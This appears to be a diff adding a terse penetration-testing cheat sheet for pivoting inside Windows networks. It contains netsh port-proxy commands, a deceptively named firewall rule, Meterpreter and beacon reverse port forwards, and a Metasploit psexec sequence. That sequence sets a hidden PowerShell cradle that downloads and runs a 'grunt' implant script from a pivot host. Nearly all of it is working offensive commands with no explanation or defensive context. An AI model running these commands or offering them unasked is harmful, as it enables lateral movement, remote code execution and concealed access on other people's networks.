@@ -1,0 +1,30 @@
+#Reverse Port Forwards
+
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+
+#meterpreter > portfwd add -R -p 8080 -l 80 -L 10.8.0.6
+#meterpreter >  portfwd add -R -p 9999 -l 443 -L 10.8.0.6
+
+#beacon> rportfwd 8080 10.8.0.6 80
+
+#Reverse Port Forward HTTP Pivots
+
+portfwd add -R -p 9999 -l 443 -L 10.8.0.6
+
+msf6 > route add 10.10.120.0/23 2
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.120.1
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/exec
+msf6 exploit(windows/smb/psexec) > set CMD powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.121.119:9999/http-grunt-pivot.ps1')"
+msf6 exploit(windows/smb/psexec) > set SMBDomain CYBER
+msf6 exploit(windows/smb/psexec) > set SMBUser 
+msf6 exploit(windows/smb/psexec) > set SMBPass 
+msf6 exploit(windows/smb/psexec) > run
+
+
+
+
+
+
+
